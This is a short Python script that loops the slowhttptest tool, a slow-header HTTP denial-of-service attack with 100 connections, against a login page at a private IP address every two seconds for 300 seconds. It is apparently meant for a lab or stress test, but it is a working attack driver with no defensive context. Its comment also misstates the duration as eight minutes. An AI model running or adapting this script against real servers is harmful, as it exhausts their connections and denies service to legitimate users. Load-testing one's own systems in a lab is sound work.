import subprocess
import time

connection_number = 100
interval = 2 #seconds

def execute_command():
    command = f"./tools/slowhttptest/bin/slowhttptest -c {connection_number} -H -g -o slowhttpheader -i 4 -r 200 -t GET -u http://10.50.50.50/login.php -x 24 -p 3"
    subprocess.run(command, shell=True)

start_time = time.time()
end_time = start_time + 300  # 8 minutes in seconds

while time.time() < end_time:
    execute_command()
    time.sleep(interval)
